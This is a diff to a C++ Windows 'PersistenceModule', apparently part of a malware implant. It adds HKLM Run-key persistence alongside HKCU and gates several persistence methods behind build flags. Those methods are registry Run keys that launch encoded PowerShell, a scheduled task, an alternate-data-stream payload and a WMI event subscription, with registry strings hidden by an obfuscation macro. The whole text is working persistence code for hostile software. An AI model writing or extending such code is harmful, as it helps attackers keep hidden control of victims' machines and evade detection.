@@ -34,7 +34,7 @@ std::string PersistenceModule::encode_ps(const std::string& path) const {
     return std::string((char*)out.data(), out_len);
 }
 
-void PersistenceModule::set_run_key(const std::string& cmd) {
+void PersistenceModule::set_run_key_hkcu(const std::string& cmd) {
     HKEY key;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
@@ -45,9 +45,34 @@ void PersistenceModule::set_run_key(const std::string& cmd) {
     }
 }
 
-bool PersistenceModule::check_run_key() const {
+void PersistenceModule::set_run_key_hklm(const std::string& cmd) {
+    HKEY key;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
+            KEY_WRITE, &key) == ERROR_SUCCESS) {
+        RegSetValueExA(key, RUN_VALUE, 0, REG_SZ,
+                       (const BYTE*)cmd.c_str(), cmd.size()+1);
+        RegCloseKey(key);
+    }
+}
+
+bool PersistenceModule::check_run_key_hkcu() const {
     HKEY key;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
+            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
+            KEY_READ, &key) != ERROR_SUCCESS) {
+        return false;
+    }
+    char buf[512];
+    DWORD len = sizeof(buf);
+    LONG ret = RegQueryValueExA(key, RUN_VALUE, NULL, NULL, (LPBYTE)buf, &len);
+    RegCloseKey(key);
+    return ret == ERROR_SUCCESS;
+}
+
+bool PersistenceModule::check_run_key_hklm() const {
+    HKEY key;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
             OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
             KEY_READ, &key) != ERROR_SUCCESS) {
         return false;
@@ -102,6 +127,12 @@ static void remove_run_key() {
         RegDeleteValueA(key, RUN_VALUE);
         RegCloseKey(key);
     }
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
+            KEY_WRITE, &key) == ERROR_SUCCESS) {
+        RegDeleteValueA(key, RUN_VALUE);
+        RegCloseKey(key);
+    }
 }
 
 static void remove_task() {
@@ -118,16 +149,29 @@ void PersistenceModule::ensure_persistence() {
 #ifdef _WIN32
     std::string path = executable_path();
     std::string ps = encode_ps(path);
-    if (!check_run_key()) {
-        set_run_key(std::string("powershell -EncodedCommand ") + ps);
+#if PERSIST_RUN_HKCU
+    if (!check_run_key_hkcu()) {
+        set_run_key_hkcu(std::string("powershell -EncodedCommand ") + ps);
     }
+#endif
+#if PERSIST_RUN_HKLM
+    if (!check_run_key_hklm()) {
+        set_run_key_hklm(std::string("powershell -EncodedCommand ") + ps);
+    }
+#endif
+#if PERSIST_TASK
     if (!check_task()) {
         set_task(path);
     }
+#endif
+#if PERSIST_ADS
     if (!ads_exists()) {
         write_ads_payload(path);
     }
+#endif
+#if PERSIST_WMI
     setup_wmi_subscription();
+#endif
 #else
     // non-Windows: no-op
 #endif
